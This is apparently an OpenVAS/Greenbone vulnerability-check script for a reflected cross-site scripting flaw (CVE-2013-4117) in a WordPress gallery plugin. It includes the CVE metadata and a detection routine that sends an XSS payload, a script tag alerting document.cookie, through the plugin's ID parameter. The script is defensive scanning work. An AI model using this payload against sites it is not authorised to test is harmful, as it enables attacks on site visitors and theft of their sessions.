CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803681" );
	script_version( "$Revision: 11401 $" );
	script_cve_id( "CVE-2013-4117" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $" );
	script_tag( name: "creation_date", value: "2013-07-03 16:01:07 +0530 (Wed, 03 Jul 2013)" );
	script_name( "WordPress Category Grid View Gallery XSS Vulnerability" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site." );
	script_tag( name: "affected", value: "WordPress Category Grid View Gallery Plugin version 2.3.1 and prior" );
	script_tag( name: "insight", value: "The flaw is caused due to an input validation error in the 'ID' parameter
in '/wp-content/plugins/category-grid-view-gallery/includes/CatGridPost.php'
when processing user-supplied data." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
since the disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one." );
	script_tag( name: "vuldetect", value: "Send the  crafted XSS query via HTTP GET nethod and confirm the vulnerability
from the response." );
	script_tag( name: "summary", value: "This host is running Category Grid View Gallery plugin and is prone to cross
site scripting vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_xref( name: "URL", value: "http://seclists.org/bugtraq/2013/Jul/17" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/na/wordpress-category-grid-view-gallery-xss" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/122259/WordPress-Category-Grid-View-Gallery-XSS.html" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (c) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
url = dir + "/wp-content/plugins/category-grid-view-gallery/includes" + "/CatGridPost.php?ID=\"><script>alert(document.cookie)</script>";
if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "<script>alert\\(document\\.cookie\\)</script>" )){
	security_message( port );
	exit( 0 );
}

